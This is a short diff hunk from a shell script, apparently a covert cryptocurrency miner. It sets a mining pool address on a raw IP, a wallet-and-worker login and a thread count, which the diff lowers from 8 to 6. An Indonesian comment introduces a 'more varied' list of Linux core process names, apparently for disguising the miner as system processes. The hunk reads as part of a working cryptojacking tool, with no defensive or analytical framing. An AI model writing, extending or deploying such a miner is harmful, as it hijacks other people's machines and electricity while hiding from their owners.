@@ -5,7 +5,7 @@ CONFIG_JSON='{
   "url": "157.173.100.15:443",
   "user": "TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Train26mlm",
   "pass": "x",
-  "threads": 8
+  "threads": 6
 }'
 
 # Daftar nama proses Linux core yang lebih beragam
